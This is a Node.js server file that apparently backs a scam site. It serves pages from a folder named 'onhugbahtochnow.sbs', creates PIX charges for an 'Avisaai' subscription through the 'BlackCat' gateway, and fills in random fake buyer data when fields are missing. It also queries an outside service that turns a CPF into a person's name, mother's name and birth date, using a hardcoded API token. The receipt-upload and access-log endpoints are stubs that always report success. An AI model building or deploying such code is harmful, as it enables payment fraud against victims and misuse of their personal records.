const fs = require("fs");
const path = require("path");

const envPath = path.join(__dirname, ".env");
try {
  require("dotenv").config({ path: envPath, override: true });
} catch {}

if (fs.existsSync(envPath)) {
  const lines = fs.readFileSync(envPath, "utf-8").split(/\r?\n/);
  for (const line of lines) {
    const cleaned = line.replace(/^\uFEFF/, "");
    const trimmed = cleaned.trim();
    if (!trimmed || trimmed.startsWith("#")) continue;
    const idx = trimmed.indexOf("=");
    if (idx === -1) continue;
    const key = trimmed.slice(0, idx).trim();
    const value = trimmed.slice(idx + 1).trim();
    if (!process.env[key]) {
      process.env[key] = value;
    }
  }
}
const http = require("http");

const PORT = process.env.PORT || 5173;
const ROOT_DIR = path.join(__dirname, "onhugbahtochnow.sbs");
const BLACKCAT_API_BASE = "https://api.blackcatpagamentos.online/api";
const BLACKCAT_CREATE_URL = `${BLACKCAT_API_BASE}/sales/create-sale`;
const BLACKCAT_COMPANY_ID = process.env.BLACKCAT_COMPANY_ID || "";
const BLACKCAT_SECRET_KEY = process.env.BLACKCAT_SECRET_KEY || "";
const BLACKCAT_API_KEY = process.env.BLACKCAT_API_KEY || process.env.BLACKCAT_SECRET_KEY || "";
const POSTBACK_URL = process.env.POSTBACK_URL || "";
const CPF_API_BASE = "https://api.amnesiatecnologia.rocks/";
const CPF_API_TOKEN = process.env.CPF_API_TOKEN || "c5eebbc9-0469-4324-85f6-0c994b42d18a";

const mimeTypes = {
  ".html": "text/html; charset=utf-8",
  ".js": "application/javascript; charset=utf-8",
  ".css": "text/css; charset=utf-8",
  ".png": "image/png",
  ".jpg": "image/jpeg",
  ".jpeg": "image/jpeg",
  ".gif": "image/gif",
  ".webp": "image/webp",
  ".svg": "image/svg+xml",
  ".ico": "image/x-icon",
  ".json": "application/json; charset=utf-8",
  ".woff2": "font/woff2",
  ".woff": "font/woff",
  ".ttf": "font/ttf",
};

function sendJSON(res, status, data) {
  res.writeHead(status, {
    "Content-Type": "application/json; charset=utf-8",
    "Access-Control-Allow-Origin": "*",
    "Access-Control-Allow-Headers": "Content-Type, Authorization",
    "Access-Control-Allow-Methods": "GET,POST,OPTIONS",
  });
  res.end(JSON.stringify(data));
}

function logError(prefix, error) {
  const message = error instanceof Error ? error.message : String(error);
  const stack = error instanceof Error && error.stack ? error.stack : "";
  console.error(prefix, message);
  if (stack) console.error(stack);
}

function parseBody(req) {
  return new Promise((resolve, reject) => {
    let body = "";
    req.on("data", (chunk) => {
      body += chunk.toString("utf-8");
    });
    req.on("end", () => {
      try {
        if (!body) return resolve({});
        const contentType = req.headers["content-type"] || "";
        if (contentType.includes("application/json")) {
          return resolve(JSON.parse(body));
        }
        if (contentType.includes("application/x-www-form-urlencoded")) {
          const params = new URLSearchParams(body);
          const obj = {};
          params.forEach((value, key) => {
            obj[key] = value;
          });
          return resolve(obj);
        }
        try {
          return resolve(JSON.parse(body));
        } catch {
          return resolve({ raw: body });
        }
      } catch (err) {
        reject(err);
      }
    });
  });
}

function sendFile(res, filePath) {
  fs.readFile(filePath, (err, data) => {
    if (err) {
      const ext = path.extname(filePath).toLowerCase();
      if (ext) {
        res.writeHead(404, { "Content-Type": "text/plain; charset=utf-8" });
        res.end("Not found");
        return;
      }
      const fallbackPath = path.join(ROOT_DIR, "index.html");
      fs.readFile(fallbackPath, (fallbackErr, fallbackData) => {
        if (fallbackErr) {
          res.writeHead(404);
          res.end("Not found");
          return;
        }
        res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
        res.end(fallbackData);
      });
      return;
    }

    const ext = path.extname(filePath).toLowerCase();
    const contentType = mimeTypes[ext] || "application/octet-stream";
    res.writeHead(200, { "Content-Type": contentType });
    res.end(data);
  });
}

function normalizeAmount(rawAmount) {
  if (rawAmount == null) return { amountCents: 100, amountNum: 1 };
  if (typeof rawAmount === "string") {
    const cleaned = rawAmount.replace(/[^\d,.-]/g, "").replace(",", ".");
    const n = parseFloat(cleaned);
    if (!Number.isFinite(n)) return { amountCents: 100, amountNum: 1 };
    return { amountCents: Math.max(1, Math.round(n * 100)), amountNum: n };
  }
  const n = Number(rawAmount);
  if (!Number.isFinite(n)) return { amountCents: 100, amountNum: 1 };
  if (Number.isInteger(n) && n >= 1000) {
    const num = n / 100;
    return { amountCents: Math.max(1, Math.round(num * 100)), amountNum: num };
  }
  return { amountCents: Math.max(1, Math.round(n * 100)), amountNum: n };
}

function extractCpfData(payload) {
  const root = payload || {};
  const base =
    root.DADOS ||
    root.dados ||
    root.data ||
    root.DadosBasicos ||
    root.dadosBasicos ||
    root.dados_basicos ||
    root;
  const nome = base.nome || base.name || "";
  const nomeMae = base.nome_mae || base.nomeMae || base.mae || "";
  const dataNasc = base.data_nascimento || base.dataNascimento || base.nascimento || "";
  const cpf = base.cpf || base.documento || base.document || "";
  return {
    cpf,
    nome,
    nome_mae: nomeMae,
    data_nascimento: dataNasc,
    sexo: base.sexo || "",
  };
}

function isPaidStatus(status) {
  const normalized = String(status || "").toLowerCase();
  return normalized === "paid" || normalized === "approved";
}

function getBlackCatHeaders(includeContentType = false) {
  if (!(BLACKCAT_SECRET_KEY || BLACKCAT_API_KEY)) {
    return null;
  }

  const headers = {};
  const resolvedApiKey = BLACKCAT_API_KEY || BLACKCAT_SECRET_KEY;
  if (includeContentType) {
    headers["Content-Type"] = "application/json";
  }

  if (BLACKCAT_COMPANY_ID) {
    headers["X-Company-Id"] = BLACKCAT_COMPANY_ID;
    headers.company_id = BLACKCAT_COMPANY_ID;
  }

  if (BLACKCAT_SECRET_KEY) {
    headers["X-Secret-Key"] = BLACKCAT_SECRET_KEY;
    headers.secret_key = BLACKCAT_SECRET_KEY;
  }

  headers["X-API-Key"] = resolvedApiKey;
  headers.Authorization = `Bearer ${resolvedApiKey}`;

  return headers;
}

async function createPixTransaction(body) {
  const headers = getBlackCatHeaders(true);
  if (!headers) {
    throw new Error("Configure BLACKCAT_SECRET_KEY no .env");
  }

  const randDigits = (len) => Array.from({ length: len }, () => Math.floor(Math.random() * 10)).join("");
  const randId = randDigits(6);
  const rawAmount = body.amount ?? 89.50;
  const { amountCents, amountNum } = normalizeAmount(rawAmount);
  const customerName = (body.nome || body.name || body.customer_name || `Cliente ${randId}`).toString();
  const customerEmail = (body.email || body.customer_email || `cliente${randId}@example.com`).toString();
  const customerPhone = (body.phone || body.customer_phone || `11${randDigits(9)}`).toString().replace(/\D/g, "");
  const cpfRaw = (body.cpf || body.document || body.customer_cpf || randDigits(11)).toString().replace(/\D/g, "");
  const customerCpf = cpfRaw.padEnd(11, "0").slice(0, 11);
  const tracking = (body.tracking || body.rastreio || body.codigo || `pedido-${randId}`).toString();
  const description = "Assinatura Avisaai";

  const payload = {
    amount: amountCents,
    currency: "BRL",
    paymentMethod: "pix",
    items: [
      {
        title: description,
        unitPrice: amountCents,
        quantity: 1,
        tangible: false,
      },
    ],
    customer: {
      name: customerName,
      email: customerEmail,
      phone: customerPhone,
      document: {
        number: customerCpf,
        type: "cpf",
      },
    },
    pix: {
      expiresInDays: 1,
    },
    externalRef: tracking,
    metadata: `tracking:${tracking}`,
  };
  if (POSTBACK_URL) payload.postbackUrl = POSTBACK_URL;

  const blackcatResp = await fetch(BLACKCAT_CREATE_URL, {
    method: "POST",
    headers,
    body: JSON.stringify(payload),
  });

  const text = await blackcatResp.text();
  if (!blackcatResp.ok) {
    throw new Error(`BlackCat ${blackcatResp.status}: ${text || "Erro ao criar PIX"}`);
  }

  let data = {};
  try {
    data = JSON.parse(text);
  } catch {
    data = {};
  }

  if (data?.success === false) {
    throw new Error(data?.error || data?.message || "Erro ao criar PIX");
  }

  const transactionData = data?.data || data;
  const pixData = transactionData?.paymentData || transactionData?.pix || {};
  const brcode =
    pixData?.copyPaste ||
    pixData?.qrCodeText ||
    pixData?.payload ||
    pixData?.brcode ||
    pixData?.qr_code ||
    pixData?.qrcode ||
    transactionData?.qrCodeText ||
    transactionData?.copyPaste ||
    transactionData?.brcode ||
    transactionData?.payload ||
    transactionData?.qrcode ||
    null;
  const qrcodeFinal =
    pixData?.qrCodeBase64 || pixData?.qrCode || pixData?.qrcode || pixData?.qr_code || pixData?.payload || brcode;
  const paymentId = transactionData?.transactionId || transactionData?.paymentId || transactionData?.id || null;
  const status = String(transactionData?.status || "PENDING").toLowerCase();
  const amountRaw = Number(transactionData?.amount);
  const amountInReais = Number.isFinite(amountRaw) ? amountRaw / 100 : amountNum;

  return {
    success: true,
    status,
    pix_code: brcode,
    transaction_id: paymentId,
    deposit_id: paymentId,
    qrcode: qrcodeFinal,
    amount: amountInReais,
    amount_cents: Number.isFinite(amountRaw) ? amountRaw : amountCents,
    key: null,
    brcode,
    payload: brcode,
    pixCode: brcode,
    paid: isPaidStatus(status),
    pix: {
      key: null,
      brcode,
      qrcode: qrcodeFinal,
      payload: brcode,
      expiresAt: pixData?.expiresAt || transactionData?.expiresAt || data?.expiresAt || null,
    },
    raw: transactionData,
    raw_response: data,
  };
}

async function checkPixStatus(id) {
  const headers = getBlackCatHeaders();
  if (!headers) {
    throw new Error("Configure BLACKCAT_SECRET_KEY no .env");
  }
  const statusResp = await fetch(`${BLACKCAT_API_BASE}/sales/${encodeURIComponent(id)}/status`, {
    method: "GET",
    headers,
  });

  const text = await statusResp.text();
  let data = {};
  try {
    data = JSON.parse(text);
  } catch {
    data = {};
  }

  if (!statusResp.ok || data?.success === false) {
    throw new Error(data?.error || data?.message || text || "Erro ao consultar pagamento");
  }

  const transactionData = data?.data || data;
  const status = String(transactionData?.status || "PENDING").toLowerCase();
  return {
    success: true,
    id,
    status,
    paid: isPaidStatus(status),
    raw: transactionData,
    raw_response: data,
  };
}

const server = http.createServer(async (req, res) => {
  if (req.method === "OPTIONS" && req.url.startsWith("/api/")) {
    res.writeHead(204, {
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Headers": "Content-Type, Authorization",
      "Access-Control-Allow-Methods": "GET,POST,OPTIONS",
    });
    res.end();
    return;
  }

  if (req.url.startsWith("/api/pix")) {
    try {
      const body = await parseBody(req);
      const response = await createPixTransaction(body);
      return sendJSON(res, 200, response);
    } catch (error) {
      logError("[PIX CREATE]", error);
      return sendJSON(res, 500, { success: false, error: String(error) });
    }
  }

  if (req.url.startsWith("/api/check-payment")) {
    try {
      const urlObj = new URL(req.url, `http://${req.headers.host}`);
      let id = urlObj.searchParams.get("id");
      if (req.method === "POST") {
        const body = await parseBody(req);
        id = body?.id || body?.paymentId || id;
      }
      if (!id) return sendJSON(res, 400, { success: false, error: "Informe o id" });
      const response = await checkPixStatus(id);
      return sendJSON(res, 200, response);
    } catch (error) {
      logError("[PIX STATUS]", error);
      return sendJSON(res, 500, { success: false, error: String(error) });
    }
  }

  if (req.url.startsWith("/api/notify-approved")) {
    return sendJSON(res, 200, { success: true });
  }

  if (req.url.startsWith("/api/consulta.php")) {
    try {
      const urlObj = new URL(req.url, `http://${req.headers.host}`);
      const cpfRaw = urlObj.searchParams.get("cpf") || "";
      const cpf = cpfRaw.replace(/\D/g, "").slice(0, 11);
      if (!cpf) return sendJSON(res, 400, { status: 400, statusMsg: "Informe o CPF" });

      const apiUrl = `${CPF_API_BASE}?token=${encodeURIComponent(CPF_API_TOKEN)}&cpf=${cpf}`;
      let apiResp;
      let text = "";
      for (let attempt = 1; attempt <= 3; attempt += 1) {
        const controller = new AbortController();
        const timeout = setTimeout(() => controller.abort(), 12000);
        try {
          apiResp = await fetch(apiUrl, {
            method: "GET",
            headers: { "User-Agent": "Mozilla/5.0" },
            signal: controller.signal,
          });
          text = await apiResp.text();
          if (apiResp.ok) break;
        } catch (error) {
          if (attempt === 3) throw error;
        } finally {
          clearTimeout(timeout);
        }
      }
      let data = {};
      try {
        data = JSON.parse(text);
      } catch {
        data = { raw: text };
      }

      if (!apiResp || !apiResp.ok) {
        return sendJSON(res, apiResp.status, data);
      }

      const dados = extractCpfData(data);
      return sendJSON(res, 200, { DADOS: dados });
    } catch (error) {
      logError("[CPF]", error);
      return sendJSON(res, 500, { status: 500, statusMsg: "Falha ao consultar CPF", details: String(error) });
    }
  }

  if (req.url.startsWith("/api/comprovantes/upload.php")) {
    return sendJSON(res, 200, { success: true });
  }

  if (req.url.startsWith("/api/log-access")) {
    return sendJSON(res, 200, { success: true });
  }

  const safePath = path
    .normalize(decodeURIComponent(req.url.split("?")[0]))
    .replace(/^(\.\.[/\\])+/, "");
  let requestedPath = safePath.replace(/^[/\\]+/, "");
  if (requestedPath === "/" || requestedPath === "") {
    requestedPath = "/index.html";
  }

  const filePath = path.join(ROOT_DIR, requestedPath);
  fs.stat(filePath, (err, stats) => {
    if (!err && stats.isDirectory()) {
      return sendFile(res, path.join(filePath, "index.html"));
    }
    return sendFile(res, filePath);
  });
});

server.listen(PORT, () => {
  console.log(`Serving on http://localhost:${PORT}`);
});
